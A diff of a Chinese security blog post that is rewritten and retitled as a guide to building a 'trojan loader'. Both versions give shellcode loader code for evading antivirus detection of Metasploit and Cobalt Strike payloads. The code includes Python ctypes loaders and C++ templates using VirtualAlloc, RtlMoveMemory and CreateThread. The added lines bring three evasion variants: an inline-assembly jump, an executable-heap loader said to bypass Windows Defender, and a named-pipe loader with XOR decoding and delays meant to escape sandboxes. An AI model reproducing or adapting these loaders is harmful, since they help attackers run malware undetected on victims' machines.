@@ -77,21 +77,21 @@
 
 
 
-<meta name="description" content="ShellCode Loader  当目标机上存在杀软时，MSF/CS默认生成的Payload极大概率会被Kill掉，这样就很难受了。这个时候我们就需要一个能免杀加载Payload的程序了.">
+<meta name="description" content="ShellCode Loader">
 <meta name="keywords" content="渗透测试,杀软对抗">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ShellCode加载器的探索与学习">
+<meta property="og:title" content="从零开始打造爆款木马加载器">
 <meta property="og:url" content="https://t43wiu6.github.io/2019/12/20/ShellCode-Loader/index.html">
 <meta property="og:site_name" content="不如茶酒伴">
-<meta property="og:description" content="ShellCode Loader  当目标机上存在杀软时，MSF/CS默认生成的Payload极大概率会被Kill掉，这样就很难受了。这个时候我们就需要一个能免杀加载Payload的程序了.">
+<meta property="og:description" content="ShellCode Loader">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://t43wiu6.github.io/2019/12/20/ShellCode-Loader/3.png">
 <meta property="og:image" content="https://t43wiu6.github.io/2019/12/20/ShellCode-Loader/1.png">
 <meta property="og:image" content="https://t43wiu6.github.io/2019/12/20/ShellCode-Loader/2.png">
-<meta property="og:updated_time" content="2019-12-26T01:39:05.022Z">
+<meta property="og:updated_time" content="2020-04-29T08:42:14.661Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ShellCode加载器的探索与学习">
-<meta name="twitter:description" content="ShellCode Loader  当目标机上存在杀软时，MSF/CS默认生成的Payload极大概率会被Kill掉，这样就很难受了。这个时候我们就需要一个能免杀加载Payload的程序了.">
+<meta name="twitter:title" content="从零开始打造爆款木马加载器">
+<meta name="twitter:description" content="ShellCode Loader">
 <meta name="twitter:image" content="https://t43wiu6.github.io/2019/12/20/ShellCode-Loader/3.png">
 
 
@@ -128,7 +128,7 @@
 
 
 
-  <title>ShellCode加载器的探索与学习 | 不如茶酒伴</title>
+  <title>从零开始打造爆款木马加载器 | 不如茶酒伴</title>
   
 
 
@@ -314,7 +314,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ShellCode加载器的探索与学习</h1>
+          <h1 class="post-title" itemprop="name headline">从零开始打造爆款木马加载器</h1>
         
 
         <div class="post-meta">
@@ -386,48 +386,34 @@
       
 
       
-        <h2 id="ShellCode-Loader"><a href="#ShellCode-Loader" class="headerlink" title="ShellCode Loader"></a>ShellCode Loader</h2><p><img src="/2019/12/20/ShellCode-Loader/3.png" alt=""></p>
-<blockquote>
-<p>当目标机上存在杀软时，MSF/CS默认生成的Payload极大概率会被Kill掉，这样就很难受了。<br>这个时候我们就需要一个能免杀加载Payload的程序了.</p>
-</blockquote>
-<a id="more"></a>
-<h2 id="Python？"><a href="#Python？" class="headerlink" title="Python？"></a>Python？</h2><p>为啥要用python呢？<br>实际上ctypes函数的原型都是c++函数，之所以使用python来打包，是因为考虑到偏门语言编译自带的一些免杀光环.</p>
-<p>加载器这个东西很多语言都可以实现，比如:</p>
+        <p><img src="/2019/12/20/ShellCode-Loader/3.png" alt=""></p>
+<h2 id="ShellCode-Loader"><a href="#ShellCode-Loader" class="headerlink" title="ShellCode Loader"></a>ShellCode Loader</h2><a id="more"></a>
+<h2 id="Python？"><a href="#Python？" class="headerlink" title="Python？"></a>Python？</h2><p>为啥用python呢？<br>实际上ctypes函数的原型都是c++函数，之所以使用python来打包，是因为考虑到偏门语言编译自带的一些免杀光环.<br>加载器这个东西很多语言都可以实现，比如:</p>
 <ul>
 <li>[go-shellcode] <a href="https://github.com/brimstone/go-shellcode" target="_blank" rel="noopener">https://github.com/brimstone/go-shellcode</a> </li>
 <li>[c#]  <a href="https://github.com/cribdragg3r/Simple-Loader" target="_blank" rel="noopener">https://github.com/cribdragg3r/Simple-Loader</a> </li>
-<li>c++</li>
+<li>c++<br>然后来康康最近网上流传的几个python加载器代码</li>
 </ul>
-<p>以上举例有部分并不完善，但作概念验证足以。<br>再来康康最近网上公开的几个python加载器代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅python2</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">shellcode = bytearray(payload)</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">""</span></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, len(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line"><span class="comment">#libc = CDLL('libc.so.6')</span></span><br><span class="line">PROT_READ = <span class="number">1</span></span><br><span class="line">PROT_WRITE = <span class="number">2</span></span><br><span class="line">PROT_EXEC = <span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executable_code</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line">    size = len(buffer)</span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr: </span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to allocate memory"</span>)</span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to set protection on buffer"</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">              ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)   </span><br><span class="line">              ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line">                                     buf,</span><br><span class="line">                                   	  ctypes.c_int(len(shellcode)))</span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>
-<p>原理都是通过ctypes库在内存注入shellcode，只要通过pyinstall打包为exe</p>
-<p>（对py版本有要求，否则报错，如我的3.7.3报错了）</p>
+<p>原理都是通过ctypes库在内存注入shellcode，只要通过pyinstall打包为exe<br>（对py版本有要求，否则运行exe时报错）</p>
 <h2 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h2><p>[python官方文档]  <a href="https://docs.python.org/3/library/ctypes.html" target="_blank" rel="noopener">https://docs.python.org/3/library/ctypes.html</a> </p>
 <p><img src="1.png" alt="image-20191107102608459"></p>
-<p>在官方文档中我们可以看到，对应的数据类型</p>
-<p>提取一下核心函数</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">VirtualAlloc(<span class="number">0</span>, len(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">WaitForSingleObject(handle, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
+<p>在官方文档中我们可以看到，对应的数据类型<br>不难看出核心函数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">VirtualAlloc(<span class="number">0</span>, len(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">WaitForSingleObject(handle, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure></p>
 <h2 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h2><p>引用一下<code>rcoil</code>大佬的原话</p>
 <blockquote>
-<p> <code>Cobalt Strike</code> 提供了两种在远程进程中分配内存并将数据复制到其中的选项，而其中默认使用项就是使用了 <strong>VirtualAllocEx</strong> -&gt; <strong>WriteProcessMemory</strong> 的经典模式，这模式也是红队工具中最常见的模式。此模式也适用于不同的进程体系结构。 </p>
+<p> <code>Cobalt Strike</code> 提供了两种在远程进程中分配内存并将数据复制到其中的选项，而其中默认使用项就是使用了 <strong>VirtualAllocEx</strong> -&gt; <strong>WriteProcessMemory</strong> 的经典模式，这模式也是红队工具中最常见的模式。此模式也适用于不同的进程体系结构。<br>而这里的<strong>VirtualAlloc</strong>也是类似的，不过<strong>VirtualAllocEx</strong> 是在另一个进程分配内存<strong>VirtualAlloc</strong>则在本进程，其函数原型为</p>
 </blockquote>
-<p>而这里的<strong>VirtualAlloc</strong>也是类似的，不过<strong>VirtualAllocEx</strong> 是在另一个进程分配内存<strong>VirtualAlloc</strong>则在本进程，其函数原型为</p>
 <p><img src="2.png" alt="image-20191107105243022"></p>
 <ul>
-<li><p><code>lpAddress</code>  要分配的区域的起始地址</p>
-</li>
-<li><p><code>dwSize</code> 要分配的大小, 以字节为单位</p>
-</li>
-<li><p><code>flAllocationType</code>  内存分配的类型,具体类型种类可以自行查看</p>
-<p> <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN</a></p>
-</li>
-<li><p><code>flProtect</code> 对要分配的页面区域的内存保护</p>
-</li>
+<li><code>lpAddress</code>  要分配的区域的起始地址</li>
+<li><code>dwSize</code> 要分配的大小, 以字节为单位</li>
+<li><code>flAllocationType</code>  内存分配的类型,具体类型种类可以自行查看<br> <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN</a></li>
+<li><code>flProtect</code> 对要分配的页面区域的内存保护</li>
 </ul>
 <h2 id="RtlMoveMemory"><a href="#RtlMoveMemory" class="headerlink" title="RtlMoveMemory"></a>RtlMoveMemory</h2><blockquote>
-<p> 将源内存块的内容复制到目标内存块 </p>
+<p>将源内存块的内容复制到目标内存块</p>
 </blockquote>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">RtlMoveMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_       VOID UNALIGNED *Destination,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  <span class="keyword">const</span> VOID UNALIGNED *Source,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_        SIZE_T         Length</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
 <ul>
@@ -448,36 +434,35 @@
 <ul>
 <li><code>lpThreadAttributes</code> 描述是否可以由子进程继承 </li>
 <li><code>dwStackSize</code> 堆栈的初始大小，以字节为单位 , 参数为0，则使用可执行文件的默认大小 (1MB)</li>
-<li><p><code>lpStartAddress</code>  该指针表示线程的起始地址 </p>
-</li>
-<li><p><code>lpParameter</code> 指向要传递给线程的变量的指针 </p>
-</li>
+<li><code>lpStartAddress</code>  该指针表示线程的起始地址 </li>
+<li><code>lpParameter</code> 指向要传递给线程的变量的指针 </li>
 <li><code>dwCreationFlags</code>  控制线程创建的标志，0为创建后立即执行</li>
 <li><code>lpThreadId</code> 指向接收线程标识符的变量的指针，为 <strong>NULL</strong>，则不返回线程标识符</li>
 </ul>
 <h2 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p><code>hHandle</code> 对象的句柄 </p>
-</li>
-<li><p><code>dwMilliseconds</code>  超时时间间隔（以毫秒为单位）  </p>
-<p>如果指定了非零值，则函数将等待直到发出信号通知对象或间隔过去 </p>
-</li>
+<li><code>hHandle</code> 对象的句柄 </li>
+<li><code>dwMilliseconds</code>  超时时间间隔（以毫秒为单位）<br>如果指定了非零值，则函数将等待直到发出信号通知对象或间隔过去 </li>
 </ul>
-<h2 id="C-原型"><a href="#C-原型" class="headerlink" title="C++原型"></a>C++原型</h2><p>很显然这些加载器的过程都是大同小异，核心就是以下流程</p>
+<h2 id="C-原型"><a href="#C-原型" class="headerlink" title="C++原型"></a>C++原型</h2><p>流程大概如下：</p>
 <ul>
 <li>通过<strong>VirtualAlloc</strong> \ <strong>VirtualAllocEx</strong>分配内存</li>
-<li>通过<strong>RtlMoveMemory</strong> \ <strong>RtlCopyMemory</strong>将Shellcode复制或移动到已分配内存中<br>（C++中可简写为memcpy\memove）</li>
-<li>使用<strong>CreateThread</strong>在子线程中运行<blockquote>
-<p>当然如果使用<strong>VirtualAllocEx</strong>就不需要使用<strong>CreateThread</strong>了</p>
-</blockquote>
-</li>
+<li>通过<strong>RtlMoveMemory</strong> \ <strong>RtlCopyMemory</strong>将Shellcode复制或移动到已分配内存中</li>
+<li>使用<strong>CreateThread</strong>调用<br>这里贴一下这些变形函数的<code>c++</code>原型</li>
 </ul>
-<p>这里贴一下这些变形函数的<code>c++</code>原型</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span>)<span class="comment">//运行不显示窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里放shellcode</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">void</span>* buffer)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>(*function)();</span><br><span class="line">	function = (<span class="keyword">void</span> (*)())buffer;</span><br><span class="line">	function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID ptr = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	RtlMoveMemory(ptr, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">	LPVOID ht = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)&amp;run, ptr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(ht, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>PS:这个原型模板编译出来的exe已经被主流杀软杀掉了，这里鄙视下360。原因你懂的</p>
+<h2 id="变形一"><a href="#变形一" class="headerlink" title="变形一"></a>变形一</h2><blockquote>
+<p>当然了，有了原型，变形也少不了。使用汇编 调用<code>shellcode</code>（仅VS编译有效）</p>
 </blockquote>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>说点题外话，<code>cobaltstrike4.0</code>的<code>artifact kit</code>中，根据作者展示的视频(可以在YouTube找到，目前只有生肉)<br>作者使用<code>HeapCreate</code>，<code>HeapAlloc</code>的方式 ,替代了常见的<code>VirtualAlloc</code>,<code>RtlMoveMemory</code>的模板，成功<code>ByPass</code>了<code>Win10</code>的<code>Defender</code>。相信很多小伙伴已经开始举一反三了呢。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/section:.data,RWE"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax, offset buf</span><br><span class="line">		jmp eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="变形二"><a href="#变形二" class="headerlink" title="变形二"></a>变形二</h2><blockquote>
+<p><code>cobaltstrike4.0</code>的<code>artifact kit</code>中，作者就使用此模板<code>bypass</code> <code>defender</code></p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/section:.data,RWE"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">void</span>* buffer)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>(*function)();</span><br><span class="line">	function = (<span class="keyword">void</span> (*)())buffer;</span><br><span class="line">	function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">void</span>* ptr = HeapAlloc(heapp, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    RtlMoveMemory(ptr, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    LPVOID ht = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)&amp;run, ptr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(ht, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="变形三"><a href="#变形三" class="headerlink" title="变形三"></a>变形三</h2><blockquote>
+<p>这个是倾旋大佬的，加入了命名管道传输<code>shellcode</code>的功能，具备一定的沙盒逃逸能力</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">"\\\\.\\pipe\\BadCodeTest"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RecvShellcode</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">    HANDLE hPipeClient;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    DWORD dwShellcodeSize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">// 等待管道可用</span></span><br><span class="line">    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);</span><br><span class="line">    <span class="comment">// 连接管道</span></span><br><span class="line">    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipeClient == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+]Can't Open Pipe , Error : %d \n"</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwWritten == dwShellcodeSize)&#123;</span><br><span class="line">        CloseHandle(hPipeClient);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+]Send Success ! Shellcode : %d Bytes\n"</span>,dwShellcodeSize);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hPipeClient);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hPipe;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    CHAR szBuffer[BUFF_SIZE];</span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    PCHAR pszShellcode = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span></span><br><span class="line">    hPipe = CreateNamedPipe(</span><br><span class="line">        ptsPipeName,</span><br><span class="line">        PIPE_ACCESS_INBOUND,</span><br><span class="line">        PIPE_TYPE_BYTE| PIPE_WAIT,</span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-]Create Pipe Error : %d \n"</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CreateThread(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)RecvShellcode,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ConnectNamedPipe(hPipe,<span class="literal">NULL</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+]Client Connected...\n"</span>);</span><br><span class="line">        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+]Get DATA Length : %d \n"</span>,dwLen);</span><br><span class="line">        <span class="comment">// 申请内存页</span></span><br><span class="line">        pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">        <span class="comment">// 拷贝内存</span></span><br><span class="line">        CopyMemory(pszShellcode,szBuffer,dwLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwLen; i++)&#123;</span><br><span class="line">            Sleep(<span class="number">50</span>);</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -520,8 +505,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/20/Metasploit-All-In-One/" rel="next" title="Metasploit-ALL-In-One">
-                <i class="fa fa-chevron-left"></i> Metasploit-ALL-In-One
+              <a href="/2019/04/20/CodeAudit-Java-Webgoat/" rel="next" title="从WebGoat学习Java代码审计">
+                <i class="fa fa-chevron-left"></i> 从WebGoat学习Java代码审计
               </a>
             
           </div>
